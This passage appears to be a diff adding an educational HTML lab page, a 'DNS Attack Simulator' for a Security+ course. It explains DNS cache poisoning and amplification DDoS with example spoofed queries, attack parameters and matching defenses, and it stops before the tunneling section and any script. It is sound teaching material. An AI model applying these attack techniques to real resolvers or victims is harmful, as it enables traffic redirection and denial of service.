@@ -1,0 +1,1051 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>DNS Attack Simulator — Security+ Lab</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@400;600;700&family=Inter:wght@300;400;500&display=swap');
+
+  :root {
+    --bg:        #080d0f;
+    --surface:   #0c1215;
+    --panel:     #101820;
+    --border:    #1a2830;
+    --cyan:      #00e5ff;
+    --cyan-dim:  #007a8c;
+    --green:     #00d68f;
+    --green-dim: #009960;
+    --red:       #ff3e3e;
+    --red-dim:   #cc2222;
+    --amber:     #ffaa00;
+    --amber-dim: #b07000;
+    --blue:      #4da6ff;
+    --blue-dim:  #2266aa;
+    --pink:      #ff4fa3;
+    --purple:    #b07aff;
+    --muted:     #1e3040;
+    --text:      #c0d8e0;
+    --text-dim:  #4a6878;
+    --mono:      'Share Tech Mono', monospace;
+    --ui:        'Rajdhani', sans-serif;
+    --body:      'Inter', sans-serif;
+  }
+
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: var(--body);
+    font-size: 14px;
+    line-height: 1.6;
+    min-height: 100vh;
+    overflow-x: hidden;
+  }
+
+  body::after {
+    content: '';
+    position: fixed; inset: 0;
+    background: repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0,0,0,0.04) 2px, rgba(0,0,0,0.04) 4px);
+    pointer-events: none; z-index: 9999;
+  }
+
+  header {
+    border-bottom: 1px solid var(--border);
+    padding: 18px 32px;
+    display: flex; align-items: center; gap: 16px;
+    background: var(--surface);
+    position: sticky; top: 0; z-index: 100;
+  }
+
+  .threat-badge {
+    background: var(--cyan);
+    color: #000; font-family: var(--mono); font-size: 10px;
+    font-weight: bold; padding: 3px 8px; letter-spacing: 2px;
+    clip-path: polygon(6px 0%, 100% 0%, calc(100% - 6px) 100%, 0% 100%);
+  }
+
+  header h1 { font-family: var(--ui); font-size: 22px; font-weight: 700; letter-spacing: 1px; color: #fff; }
+  header h1 span { color: var(--cyan); }
+  .course-tag { margin-left: auto; font-family: var(--mono); font-size: 11px; color: var(--text-dim); border: 1px solid var(--border); padding: 4px 10px; }
+
+  .progress-bar  { height: 3px; background: var(--border); }
+  .progress-fill { height: 100%; background: linear-gradient(90deg, var(--cyan-dim), var(--cyan)); transition: width 0.4s ease; width: 33.3%; }
+
+  .container { max-width: 1240px; margin: 0 auto; padding: 28px 32px 60px; }
+
+  /* ── PHASE NAV ── */
+  .phase-nav { display: flex; gap: 0; margin-bottom: 32px; border: 1px solid var(--border); overflow: hidden; }
+  .phase-btn {
+    flex: 1; background: var(--surface); border: none; border-right: 1px solid var(--border);
+    color: var(--text-dim); font-family: var(--ui); font-size: 12px; font-weight: 600;
+    letter-spacing: 0.5px; padding: 14px 8px; cursor: pointer; transition: all 0.2s;
+    display: flex; flex-direction: column; align-items: center; gap: 4px;
+  }
+  .phase-btn:last-child { border-right: none; }
+  .phase-btn .num  { font-family: var(--mono); font-size: 18px; color: var(--border); transition: color 0.2s; }
+  .phase-btn .sub  { font-size: 10px; color: var(--text-dim); letter-spacing: 1px; }
+  .phase-btn:hover { background: var(--panel); color: var(--text); }
+  .phase-btn:hover .num { color: var(--muted); }
+  .phase-btn.active { background: var(--panel); color: var(--cyan); border-bottom: 2px solid var(--cyan); }
+  .phase-btn.active .num { color: var(--cyan); }
+  .phase-btn.done { color: var(--green-dim); }
+  .phase-btn.done .num { color: var(--green-dim); }
+
+  .phase { display: none; }
+  .phase.active { display: grid; grid-template-columns: 1fr 1fr; gap: 24px; }
+  .full { grid-column: 1 / -1; }
+
+  /* ── CARD ── */
+  .card { background: var(--surface); border: 1px solid var(--border); padding: 24px; position: relative; }
+  .card::before { content: ''; position: absolute; top: 0; left: 0; width: 100%; height: 2px; }
+  .card.cyan::before   { background: var(--cyan); }
+  .card.red::before    { background: var(--red); }
+  .card.amber::before  { background: var(--amber); }
+  .card.green::before  { background: var(--green); }
+  .card.blue::before   { background: var(--blue); }
+  .card.purple::before { background: var(--purple); }
+  .card.pink::before   { background: var(--pink); }
+
+  .card-title { font-family: var(--ui); font-size: 12px; font-weight: 700; letter-spacing: 2px; text-transform: uppercase; color: var(--text-dim); margin-bottom: 16px; display: flex; align-items: center; gap: 8px; }
+  .card-title .dot { width: 6px; height: 6px; border-radius: 50%; }
+  .card.cyan   .card-title .dot { background: var(--cyan); }
+  .card.red    .card-title .dot { background: var(--red); }
+  .card.amber  .card-title .dot { background: var(--amber); }
+  .card.green  .card-title .dot { background: var(--green); }
+  .card.blue   .card-title .dot { background: var(--blue); }
+  .card.purple .card-title .dot { background: var(--purple); }
+  .card.pink   .card-title .dot { background: var(--pink); }
+
+  .concept { font-size: 13px; color: var(--text-dim); line-height: 1.7; margin-bottom: 12px; }
+  .concept strong { color: var(--text); }
+  .concept:last-child { margin-bottom: 0; }
+
+  /* ── BUTTONS ── */
+  .btn { background: transparent; border: 1px solid var(--border); color: var(--text); font-family: var(--ui); font-size: 13px; font-weight: 700; letter-spacing: 1px; padding: 10px 24px; cursor: pointer; transition: all 0.15s; display: inline-flex; align-items: center; gap: 8px; }
+  .btn:hover { background: var(--panel); border-color: var(--muted); }
+  .btn.primary { border-color: var(--cyan-dim); color: var(--cyan); }
+  .btn.primary:hover { background: rgba(0,229,255,0.07); border-color: var(--cyan); }
+  .btn.danger  { border-color: var(--red-dim);  color: var(--red); }
+  .btn.danger:hover { background: rgba(255,62,62,0.07); border-color: var(--red); }
+  .btn.amber-btn { border-color: var(--amber-dim); color: var(--amber); }
+  .btn.amber-btn:hover { background: rgba(255,170,0,0.07); }
+  .btn.green-btn { border-color: var(--green-dim); color: var(--green); }
+  .btn.green-btn:hover { background: rgba(0,214,143,0.07); }
+  .btn.purple-btn { border-color: #7755bb; color: var(--purple); }
+  .btn.purple-btn:hover { background: rgba(176,122,255,0.07); }
+  .btn-row { display: flex; gap: 10px; flex-wrap: wrap; margin-top: 14px; }
+
+  /* ── TERMINAL / LOG ── */
+  .terminal { background: #000; border: 1px solid var(--border); font-family: var(--mono); font-size: 11px; padding: 14px; line-height: 1.9; }
+  .terminal.scrollable { max-height: 220px; overflow-y: auto; }
+  .t-cyan   { color: var(--cyan); }
+  .t-green  { color: var(--green); }
+  .t-red    { color: var(--red); }
+  .t-amber  { color: var(--amber); }
+  .t-blue   { color: var(--blue); }
+  .t-purple { color: var(--purple); }
+  .t-dim    { color: var(--text-dim); }
+  .t-white  { color: #fff; }
+  .t-ts     { color: var(--muted); }
+  .t-bold   { font-weight: bold; }
+
+  /* ── PACKET VISUALIZER ── */
+  .packet-row { display: flex; align-items: center; gap: 0; margin: 8px 0; font-family: var(--mono); font-size: 11px; }
+  .pkt { border: 1px solid var(--border); padding: 5px 10px; white-space: nowrap; }
+  .pkt.src   { border-color: var(--blue);   color: var(--blue);   background: rgba(77,166,255,0.06); }
+  .pkt.dns   { border-color: var(--cyan);   color: var(--cyan);   background: rgba(0,229,255,0.06); }
+  .pkt.atk   { border-color: var(--red);    color: var(--red);    background: rgba(255,62,62,0.06); }
+  .pkt.resp  { border-color: var(--green);  color: var(--green);  background: rgba(0,214,143,0.06); }
+  .pkt.amp   { border-color: var(--amber);  color: var(--amber);  background: rgba(255,170,0,0.06); }
+  .pkt.tun   { border-color: var(--purple); color: var(--purple); background: rgba(176,122,255,0.06); }
+  .pkt-arrow { color: var(--text-dim); padding: 0 4px; font-size: 14px; }
+  .pkt-label { color: var(--text-dim); font-size: 10px; margin-left: 8px; }
+
+  /* ── DNS TABLE ── */
+  .dns-table { width: 100%; border-collapse: collapse; font-family: var(--mono); font-size: 11px; }
+  .dns-table th { background: var(--panel); color: var(--text-dim); font-family: var(--ui); font-size: 11px; letter-spacing: 1px; text-transform: uppercase; padding: 8px 12px; border: 1px solid var(--border); text-align: left; }
+  .dns-table td { padding: 7px 12px; border: 1px solid var(--border); }
+  .dns-table tr.legit   td { color: var(--text); }
+  .dns-table tr.poisoned td { color: var(--red); background: rgba(255,62,62,0.04); }
+  .dns-table tr.poisoned td:first-child::before { content: '⚠ '; }
+  .dns-table tr.new td { animation: fadeIn 0.6s ease; }
+
+  @keyframes fadeIn { from { opacity: 0; background: rgba(0,229,255,0.15); } to { opacity: 1; } }
+
+  /* ── CALLOUT ── */
+  .callout { border-left: 3px solid var(--amber); padding: 10px 14px; background: rgba(255,170,0,0.05); font-size: 12px; color: var(--text-dim); margin: 12px 0; line-height: 1.7; }
+  .callout.cyan   { border-color: var(--cyan);   background: rgba(0,229,255,0.05); }
+  .callout.red    { border-color: var(--red);    background: rgba(255,62,62,0.06); color: var(--text); }
+  .callout.green  { border-color: var(--green);  background: rgba(0,214,143,0.05); }
+  .callout.purple { border-color: var(--purple); background: rgba(176,122,255,0.05); }
+  .callout.blue   { border-color: var(--blue);   background: rgba(77,166,255,0.05); }
+  .callout strong { color: var(--text); }
+
+  /* ── COMPARE ── */
+  .compare-row { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-bottom: 10px; }
+  .compare-bad, .compare-good { padding: 12px; font-family: var(--mono); font-size: 11px; line-height: 1.8; border: 1px solid; }
+  .compare-bad  { border-color: var(--red-dim);   background: rgba(255,62,62,0.04); }
+  .compare-good { border-color: var(--green-dim); background: rgba(0,214,143,0.04); }
+  .compare-label { font-family: var(--ui); font-size: 11px; font-weight: 700; letter-spacing: 1px; margin-bottom: 8px; padding-bottom: 6px; border-bottom: 1px solid var(--border); }
+  .compare-bad  .compare-label { color: var(--red); }
+  .compare-good .compare-label { color: var(--green); }
+
+  .tag { display: inline-block; font-family: var(--mono); font-size: 10px; letter-spacing: 1px; padding: 2px 7px; border: 1px solid; margin: 2px; }
+  .tag.vuln  { border-color: var(--red-dim);    color: var(--red); }
+  .tag.safe  { border-color: var(--green-dim);  color: var(--green); }
+  .tag.info  { border-color: var(--blue-dim);   color: var(--blue); }
+  .tag.cyan  { border-color: var(--cyan-dim);   color: var(--cyan); }
+  .tag.amber { border-color: var(--amber-dim);  color: var(--amber); }
+  .tag.purp  { border-color: #7755bb;           color: var(--purple); }
+
+  code { background: var(--panel); border: 1px solid var(--border); font-family: var(--mono); font-size: 11px; padding: 1px 5px; color: var(--amber); }
+
+  .divider { display: flex; align-items: center; gap: 14px; margin: 22px 0 18px; color: var(--muted); font-family: var(--mono); font-size: 10px; letter-spacing: 2px; }
+  .divider::before, .divider::after { content: ''; flex: 1; height: 1px; background: var(--border); }
+
+  label { display: block; font-family: var(--ui); font-size: 11px; font-weight: 700; letter-spacing: 1px; color: var(--text-dim); margin-bottom: 6px; text-transform: uppercase; }
+
+  /* ── METER ── */
+  .meter-wrap { margin: 10px 0; }
+  .meter-label { display: flex; justify-content: space-between; font-family: var(--mono); font-size: 11px; color: var(--text-dim); margin-bottom: 5px; }
+  .meter-track { height: 14px; background: var(--panel); border: 1px solid var(--border); overflow: hidden; }
+  .meter-fill  { height: 100%; width: 0%; transition: width 0.4s ease; }
+
+  /* ── ATTACK SCENARIO STEPS ── */
+  .atk-step { display: flex; gap: 14px; padding: 12px 14px; border: 1px solid var(--border); margin-bottom: 8px; background: var(--panel); cursor: pointer; transition: all 0.15s; }
+  .atk-step:hover { border-color: var(--cyan-dim); }
+  .atk-step.active { border-color: var(--cyan); background: rgba(0,229,255,0.04); }
+  .atk-step .sn { font-family: var(--mono); font-size: 22px; color: var(--border); min-width: 30px; transition: color 0.2s; }
+  .atk-step.active .sn { color: var(--cyan); }
+  .atk-step .sc .st  { font-family: var(--ui); font-size: 13px; font-weight: 700; color: var(--text); margin-bottom: 2px; }
+  .atk-step .sc .sd  { font-size: 12px; color: var(--text-dim); }
+
+  /* ── AMPLIFICATION METER ── */
+  .amp-stat { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 12px; margin: 16px 0; }
+  .amp-box { background: var(--panel); border: 1px solid var(--border); padding: 14px; text-align: center; }
+  .amp-box .av { font-family: var(--mono); font-size: 24px; font-weight: bold; }
+  .amp-box .al { font-family: var(--ui); font-size: 11px; letter-spacing: 1px; color: var(--text-dim); margin-top: 4px; text-transform: uppercase; }
+  .amp-box.red   .av { color: var(--red); }
+  .amp-box.amber .av { color: var(--amber); }
+  .amp-box.cyan  .av { color: var(--cyan); }
+
+  /* ── TUNNEL DECODE ── */
+  .tunnel-row { display: grid; grid-template-columns: 1fr 40px 1fr; align-items: center; gap: 8px; margin: 8px 0; font-family: var(--mono); font-size: 11px; }
+  .tunnel-enc  { background: var(--panel); border: 1px solid var(--border); padding: 7px 10px; color: var(--purple); word-break: break-all; }
+  .tunnel-dec  { background: var(--panel); border: 1px solid var(--green-dim); padding: 7px 10px; color: var(--green); word-break: break-all; }
+  .tunnel-arr  { text-align: center; color: var(--text-dim); font-size: 16px; }
+
+  /* ── MODAL ── */
+  .modal-overlay { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.88); z-index: 1000; align-items: center; justify-content: center; }
+  .modal-overlay.show { display: flex; }
+  .modal { background: var(--surface); border: 1px solid var(--cyan-dim); border-top: 3px solid var(--cyan); padding: 28px 32px; max-width: 560px; width: 90%; }
+  .modal-title { font-family: var(--ui); font-size: 14px; font-weight: 700; letter-spacing: 2px; color: var(--cyan); margin-bottom: 14px; text-transform: uppercase; }
+  .modal-body  { font-family: var(--mono); font-size: 12px; color: var(--text); line-height: 1.9; margin-bottom: 20px; }
+
+  /* ── OUTCOME ── */
+  .outcome { padding: 12px 16px; font-family: var(--mono); font-size: 12px; line-height: 1.8; border: 1px solid var(--border); margin-top: 12px; min-height: 52px; transition: all 0.3s; color: var(--text-dim); }
+  .outcome.attack  { border-color: var(--red);   background: rgba(255,62,62,0.07);  color: var(--red); }
+  .outcome.defend  { border-color: var(--green); background: rgba(0,214,143,0.07); color: var(--green); }
+  .outcome.active  { border-color: var(--amber); background: rgba(255,170,0,0.06);  color: var(--amber); }
+
+  input[type=text], input[type=number] {
+    width: 100%; background: var(--panel); border: 1px solid var(--border);
+    color: var(--text); font-family: var(--mono); font-size: 13px;
+    padding: 9px 12px; outline: none; transition: border-color 0.2s; margin-bottom: 10px;
+  }
+  input[type=text]:focus { border-color: var(--cyan); }
+  select {
+    width: 100%; background: var(--panel); border: 1px solid var(--border);
+    color: var(--text); font-family: var(--mono); font-size: 12px;
+    padding: 9px 12px; outline: none; margin-bottom: 10px;
+  }
+</style>
+</head>
+<body>
+
+<header>
+  <div class="threat-badge">NETWORK</div>
+  <h1>DNS <span>Attack</span> Simulator</h1>
+  <div class="course-tag">SECURITY+ LAB // CIS108</div>
+</header>
+<div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
+
+<div class="container">
+
+  <nav class="phase-nav">
+    <button class="phase-btn active" onclick="goPhase(1)">
+      <span class="num">01</span>CACHE POISONING<span class="sub">SPOOFING</span>
+    </button>
+    <button class="phase-btn" onclick="goPhase(2)">
+      <span class="num">02</span>AMPLIFICATION<span class="sub">DDoS</span>
+    </button>
+    <button class="phase-btn" onclick="goPhase(3)">
+      <span class="num">03</span>TUNNELING<span class="sub">EXFIL / C2</span>
+    </button>
+  </nav>
+
+  <!-- ══════════════════════════════════════════════════
+       PHASE 1 — DNS CACHE POISONING
+  ══════════════════════════════════════════════════ -->
+  <div class="phase active" id="phase1">
+
+    <div class="card cyan">
+      <div class="card-title"><span class="dot"></span>WHAT IS DNS CACHE POISONING?</div>
+      <p class="concept">A <strong>DNS resolver</strong> caches records it has looked up to avoid querying upstream servers on every request. <strong>Cache poisoning</strong> (aka DNS spoofing) injects forged records into that cache — mapping a legitimate domain to an attacker-controlled IP. Every user who queries the poisoned resolver gets sent to the wrong address.</p>
+      <p class="concept">The classic exploit (pre-DNSSEC) exploited the fact that DNS uses <strong>UDP</strong> — a connectionless protocol with predictable transaction IDs. An attacker who could guess or brute-force the 16-bit transaction ID could win a race to inject a forged response before the real authoritative server replied.</p>
+      <div class="callout cyan">
+        <strong>Kaminsky Attack (2008):</strong> Dan Kaminsky discovered that attackers don't need to poison the exact record — they can poison the <em>NS record</em> for the zone itself, redirecting all future lookups for an entire domain. This was a critical vulnerability affecting nearly all resolvers.
+      </div>
+
+      <div style="margin-top:14px;">
+        <label>ATTACK FLOW</label>
+        <div class="packet-row">
+          <div class="pkt src">User Browser</div>
+          <div class="pkt-arrow">→</div>
+          <div class="pkt dns">Recursive Resolver</div>
+          <div class="pkt-arrow">→</div>
+          <div class="pkt dns">Root / Auth NS</div>
+          <div class="pkt-label">(normal lookup)</div>
+        </div>
+        <div class="packet-row">
+          <div class="pkt atk">Attacker</div>
+          <div class="pkt-arrow">→→</div>
+          <div class="pkt dns">Recursive Resolver</div>
+          <div class="pkt-arrow">←</div>
+          <div class="pkt atk">Forged Response</div>
+          <div class="pkt-label">(wins race → cache poisoned)</div>
+        </div>
+        <div class="packet-row">
+          <div class="pkt src">User Browser</div>
+          <div class="pkt-arrow">→</div>
+          <div class="pkt dns">Resolver (poisoned)</div>
+          <div class="pkt-arrow">→</div>
+          <div class="pkt atk">Evil Server IP</div>
+          <div class="pkt-label">(victim redirected)</div>
+        </div>
+      </div>
+    </div>
+
+    <div class="card red">
+      <div class="card-title"><span class="dot"></span>WHY IT WORKS — TRANSACTION IDs</div>
+      <p class="concept" style="margin-bottom:12px;">DNS queries over UDP include a 16-bit transaction ID (<strong>TXID</strong>). The resolver accepts whichever response arrives first with a matching TXID. Old resolvers used predictable TXIDs — attackers could flood responses guessing all 65,536 possible values before the real reply arrived.</p>
+
+      <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-bottom:14px;">
+        <div style="border:1px solid var(--border);padding:12px;">
+          <div style="font-family:var(--ui);font-weight:700;color:var(--red);margin-bottom:8px;font-size:12px;">Old Resolvers (Vulnerable)</div>
+          <div class="terminal" style="font-size:10px;line-height:1.9;">
+            Query → TXID: <span class="t-amber">0x0001</span><br>
+            Query → TXID: <span class="t-amber">0x0002</span><br>
+            Query → TXID: <span class="t-amber">0x0003</span><br>
+            <span class="t-dim">// Sequential — trivial to predict</span><br>
+            <span class="t-dim">// Attacker floods all 65536 TXIDs</span>
+          </div>
+        </div>
+        <div style="border:1px solid var(--border);padding:12px;">
+          <div style="font-family:var(--ui);font-weight:700;color:var(--green);margin-bottom:8px;font-size:12px;">Modern Resolvers (Hardened)</div>
+          <div class="terminal" style="font-size:10px;line-height:1.9;">
+            Query → TXID: <span class="t-green">0x8f3a</span><br>
+            Query → TXID: <span class="t-green">0x2c91</span><br>
+            Query → TXID: <span class="t-green">0xb54e</span><br>
+            <span class="t-dim">// Random + source port randomization</span><br>
+            <span class="t-dim">// 16-bit × 16-bit = 32-bit entropy</span>
+          </div>
+        </div>
+      </div>
+
+      <div class="callout red">
+        <strong>Real-world impact:</strong> A poisoned cache can redirect users of an entire ISP or organization to phishing sites, intercept credentials, or silently MitM encrypted traffic if the attacker presents a forged cert.
+      </div>
+    </div>
+
+    <div class="full">
+      <div class="card amber">
+        <div class="card-title"><span class="dot"></span>INTERACTIVE — POISON A RESOLVER CACHE</div>
+        <div style="display:grid;grid-template-columns:1fr 1fr;gap:24px;">
+
+          <div>
+            <p class="concept" style="margin-bottom:14px;">Simulate a cache poisoning attack. Set the target domain and the IP you want to inject, then race the legitimate authoritative server.</p>
+
+            <label>TARGET DOMAIN</label>
+            <input type="text" id="poisonDomain" value="secure-bank.com" />
+
+            <label>ATTACKER'S MALICIOUS IP</label>
+            <input type="text" id="poisonIP" value="192.168.66.66" />
+
+            <label>RESOLVER TXID RANDOMIZATION</label>
+            <select id="txidMode">
+              <option value="sequential">Sequential (Old / Vulnerable)</option>
+              <option value="random">Randomized (Modern / Hardened)</option>
+            </select>
+
+            <div class="btn-row">
+              <button class="btn danger" onclick="runPoisonAttack()">⚡ LAUNCH POISONING ATTACK</button>
+              <button class="btn" onclick="resetPoison()">↺ RESET</button>
+            </div>
+          </div>
+
+          <div>
+            <label>RESOLVER CACHE — <span id="cacheStatus" style="color:var(--green);font-weight:bold;">CLEAN</span></label>
+            <div style="overflow-x:auto;">
+              <table class="dns-table" id="cacheTable">
+                <thead><tr><th>DOMAIN</th><th>TYPE</th><th>IP / VALUE</th><th>TTL</th><th>SOURCE</th></tr></thead>
+                <tbody id="cacheTbody">
+                  <tr class="legit"><td>google.com</td><td>A</td><td>142.250.80.46</td><td>300s</td><td>auth-ns</td></tr>
+                  <tr class="legit"><td>cloudflare.com</td><td>A</td><td>104.16.124.96</td><td>300s</td><td>auth-ns</td></tr>
+                  <tr class="legit"><td>secure-bank.com</td><td>A</td><td>203.0.113.42</td><td>300s</td><td>auth-ns</td></tr>
+                </tbody>
+              </table>
+            </div>
+            <div class="outcome" id="poisonOutcome">Run the attack to see the result...</div>
+          </div>
+        </div>
+
+        <div style="margin-top:16px;">
+          <label>RACE LOG</label>
+          <div class="terminal scrollable" id="poisonLog">
+            <span class="t-dim">// Resolver cache poisoning simulation ready</span><br>
+            <span class="t-dim">// Choose TXID mode and click LAUNCH to begin</span>
+          </div>
+        </div>
+
+        <div class="divider">DEFENSES</div>
+        <div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:12px;">
+          <div style="border:1px solid var(--green-dim);padding:12px;background:rgba(0,214,143,0.04);">
+            <div style="font-family:var(--ui);font-weight:700;color:var(--green);margin-bottom:6px;">DNSSEC</div>
+            <div class="concept">Cryptographically signs DNS records. Resolvers validate signatures — a forged record with no valid signature is rejected regardless of TXID. The gold standard defense.</div>
+            <div style="margin-top:6px;"><span class="tag safe">PRIMARY FIX</span></div>
+          </div>
+          <div style="border:1px solid var(--cyan-dim);padding:12px;background:rgba(0,229,255,0.03);">
+            <div style="font-family:var(--ui);font-weight:700;color:var(--cyan);margin-bottom:6px;">Source Port Randomization</div>
+            <div class="concept">Randomizing both the TXID and UDP source port raises the attack entropy to ~32 bits, making brute-force flooding statistically infeasible before TTL expires.</div>
+            <div style="margin-top:6px;"><span class="tag cyan">HARDENING</span></div>
+          </div>
+          <div style="border:1px solid var(--amber-dim);padding:12px;background:rgba(255,170,0,0.03);">
+            <div style="font-family:var(--ui);font-weight:700;color:var(--amber);margin-bottom:6px;">DNS over HTTPS / TLS</div>
+            <div class="concept">DoH/DoT encrypts DNS queries, preventing MITM interception and making off-path cache injection significantly harder.</div>
+            <div style="margin-top:6px;"><span class="tag amber">TRANSPORT SEC</span></div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="full" style="display:flex;justify-content:flex-end;">
+      <button class="btn primary" onclick="goPhase(2)">NEXT: AMPLIFICATION →</button>
+    </div>
+  </div>
+
+  <!-- ══════════════════════════════════════════════════
+       PHASE 2 — DNS AMPLIFICATION
+  ══════════════════════════════════════════════════ -->
+  <div class="phase" id="phase2">
+
+    <div class="card amber">
+      <div class="card-title"><span class="dot"></span>WHAT IS DNS AMPLIFICATION?</div>
+      <p class="concept">A DNS amplification attack is a <strong>volumetric DDoS</strong> technique that abuses open DNS resolvers as bandwidth amplifiers. The attacker sends small queries to open resolvers with the <strong>source IP spoofed</strong> to be the victim's address. The resolvers respond with large answers — sent to the victim.</p>
+      <p class="concept">The <strong>amplification factor</strong> is the ratio of response size to query size. A 50-byte query for a large ANY record can return a 4,000-byte response — an <strong>80× amplification</strong>. With thousands of open resolvers, an attacker with a modest upstream connection can generate hundreds of Gbps of traffic toward the victim.</p>
+      <div class="callout amber">
+        <strong>ANY record abuse:</strong> DNS <code>ANY</code> queries ask for all record types for a domain — the response can include A, AAAA, MX, TXT, NS, SOA records in one packet. Attackers use domains with large TXT/DKIM records to maximize response size. RFC 8482 deprecated ANY queries to address this.
+      </div>
+    </div>
+
+    <div class="card red">
+      <div class="card-title"><span class="dot"></span>HOW AMPLIFICATION WORKS</div>
+
+      <div style="margin-bottom:14px;">
+        <div class="packet-row" style="margin-bottom:4px;">
+          <div class="pkt atk" style="min-width:100px;">Attacker<br><span style="font-size:9px;color:var(--text-dim);">real IP: 10.0.0.1</span></div>
+          <div class="pkt-arrow">→</div>
+          <div class="pkt dns">Open Resolver A</div>
+          <div class="pkt-label">50-byte query, src=<span style="color:var(--red);">VICTIM_IP</span></div>
+        </div>
+        <div class="packet-row" style="margin-bottom:4px;">
+          <div class="pkt atk" style="min-width:100px;">Attacker</div>
+          <div class="pkt-arrow">→</div>
+          <div class="pkt dns">Open Resolver B</div>
+          <div class="pkt-label">50-byte query, src=<span style="color:var(--red);">VICTIM_IP</span></div>
+        </div>
+        <div class="packet-row" style="margin-bottom:4px;">
+          <div class="pkt atk" style="min-width:100px;">Attacker</div>
+          <div class="pkt-arrow">→</div>
+          <div class="pkt dns">Open Resolver C</div>
+          <div class="pkt-label">50-byte query, src=<span style="color:var(--red);">VICTIM_IP</span></div>
+        </div>
+        <div class="packet-row">
+          <div class="pkt amp" style="min-width:100px;">~4000 bytes each</div>
+          <div class="pkt-arrow">→→→</div>
+          <div class="pkt src">VICTIM</div>
+          <div class="pkt-label" style="color:var(--red);">Bandwidth overwhelmed</div>
+        </div>
+      </div>
+
+      <div class="compare-row" style="margin-top:0;">
+        <div>
+          <div class="compare-bad">
+            <div class="compare-label">❌ WITHOUT PROTECTION</div>
+            <span class="t-dim">// Open resolver responds to anyone</span><br>
+            Source IP: <span style="color:var(--red);">victim.ip.here</span> (spoofed)<br>
+            Query: <span style="color:var(--amber);">ANY icloud.com</span>  ← 50B<br>
+            Response: <span style="color:var(--red);">4,096B</span> → sent to victim<br>
+            <span style="color:var(--red);">Amplification: 82×</span>
+          </div>
+        </div>
+        <div>
+          <div class="compare-good">
+            <div class="compare-label">✓ WITH BCP38 + RRL</div>
+            <span class="t-dim">// ISP drops spoofed-src packets</span><br>
+            Ingress filter: <span style="color:var(--green);">BLOCKS spoofed src</span><br>
+            Rate limit: <span style="color:var(--green);">max 5 resp/sec/IP</span><br>
+            ANY query: <span style="color:var(--green);">deprecated (RFC 8482)</span><br>
+            <span style="color:var(--green);">Attack nullified</span>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="full">
+      <div class="card cyan">
+        <div class="card-title"><span class="dot"></span>INTERACTIVE — AMPLIFICATION CALCULATOR</div>
+        <div style="display:grid;grid-template-columns:1fr 1fr;gap:28px;">
+          <div>
+            <p class="concept" style="margin-bottom:16px;">Simulate an amplification DDoS. Configure the attack parameters and see how traffic scales toward the victim.</p>
+
+            <label>QUERY TYPE (determines response size)</label>
+            <select id="queryType" onchange="calcAmp()">
+              <option value="28,512">A record — 28B query / 512B response</option>
+              <option value="50,3000" selected>ANY record — 50B query / ~3000B response</option>
+              <option value="50,4096">ANY + DNSSEC — 50B query / 4096B response</option>
+              <option value="40,2000">TXT (DKIM) — 40B query / ~2000B response</option>
+              <option value="42,450">MX record — 42B query / ~450B response</option>
+            </select>
+
+            <label>NUMBER OF OPEN RESOLVERS ABUSED</label>
+            <input type="number" id="resolverCount" value="5000" min="1" max="500000" oninput="calcAmp()" />
+
+            <label>ATTACKER UPSTREAM BANDWIDTH (Mbps)</label>
+            <input type="number" id="attackerBw" value="100" min="1" max="100000" oninput="calcAmp()" />
+
+            <div class="btn-row">
+              <button class="btn danger" onclick="launchAmp()">⚡ SIMULATE ATTACK</button>
+              <button class="btn" onclick="resetAmp()">↺ RESET</button>
+            </div>
+          </div>
+
+          <div>
+            <div class="amp-stat">
+              <div class="amp-box cyan">
+                <div class="av" id="statAmpFactor">60×</div>
+                <div class="al">Amplification</div>
+              </div>
+              <div class="amp-box amber">
+                <div class="av" id="statAttackGbps">0</div>
+                <div class="al">Attack Gbps</div>
+              </div>
+              <div class="amp-box red">
+                <div class="av" id="statQps">0</div>
+                <div class="al">Queries/sec</div>
+              </div>
+            </div>
+
+            <label>VICTIM INBOUND TRAFFIC</label>
+            <div class="meter-wrap">
+              <div class="meter-label"><span>0 Gbps</span><span id="meterLabel">0 Gbps</span></div>
+              <div class="meter-track"><div class="meter-fill" id="victimMeter" style="background:var(--red);"></div></div>
+            </div>
+
+            <div class="outcome" id="ampOutcome">Configure parameters above and click SIMULATE ATTACK.</div>
+
+            <div style="margin-top:12px;">
+              <label>SIMULATION LOG</label>
+              <div class="terminal scrollable" id="ampLog">
+                <span class="t-dim">// Amplification attack simulator ready</span>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <div class="divider">DEFENSES</div>
+        <div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:12px;">
+          <div style="border:1px solid var(--green-dim);padding:12px;background:rgba(0,214,143,0.04);">
+            <div style="font-family:var(--ui);font-weight:700;color:var(--green);margin-bottom:6px;">BCP38 — Ingress Filtering</div>
+            <div class="concept">ISPs implement BCP38 to drop packets where the source IP doesn't match the originating network. Eliminates IP spoofing — the prerequisite for reflection/amplification attacks.</div>
+            <div style="margin-top:6px;"><span class="tag safe">ROOT FIX</span></div>
+          </div>
+          <div style="border:1px solid var(--cyan-dim);padding:12px;background:rgba(0,229,255,0.03);">
+            <div style="font-family:var(--ui);font-weight:700;color:var(--cyan);margin-bottom:6px;">Rate Limiting (RRL)</div>
+            <div class="concept">DNS Response Rate Limiting caps how many responses a resolver sends to the same source IP per second. Limits the amplification each resolver can contribute to an attack.</div>
+            <div style="margin-top:6px;"><span class="tag cyan">MITIGATION</span></div>
+          </div>
+          <div style="border:1px solid var(--amber-dim);padding:12px;background:rgba(255,170,0,0.03);">
+            <div style="font-family:var(--ui);font-weight:700;color:var(--amber);margin-bottom:6px;">Close Open Resolvers</div>
+            <div class="concept">Configure DNS resolvers to only answer queries from authorized networks (internal clients, not the entire internet). Eliminates the resolver as a weapon.</div>
+            <div style="margin-top:6px;"><span class="tag amber">HARDENING</span></div>
+          </div>
+        </div>
